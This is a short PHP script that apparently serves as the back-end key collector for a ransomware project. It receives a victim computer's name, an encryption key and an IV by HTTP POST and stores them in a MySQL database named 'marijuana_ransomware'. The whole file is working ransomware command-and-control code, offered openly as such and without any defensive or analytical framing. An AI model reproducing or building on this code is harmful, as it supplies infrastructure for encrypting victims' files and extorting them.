<?php

if(isset($_POST["pc_ismi"], $_POST["_key"], $_POST["iv"]) && 
	!empty($_POST["pc_ismi"]) && !empty($_POST["_key"]) && !empty($_POST["iv"])) {
		$baglanti = new PDO("mysql:host=localhost;dbname=marijuana_ransomware", "root", "");
		$bilgiler = $baglanti->prepare("INSERT INTO bilgiler (pc_ismi, _key, iv) VALUES (?, ?, ?)");
		$bilgiler->execute(array($_POST["pc_ismi"], $_POST["_key"], $_POST["iv"]));
		$baglanti = null;
	}


?>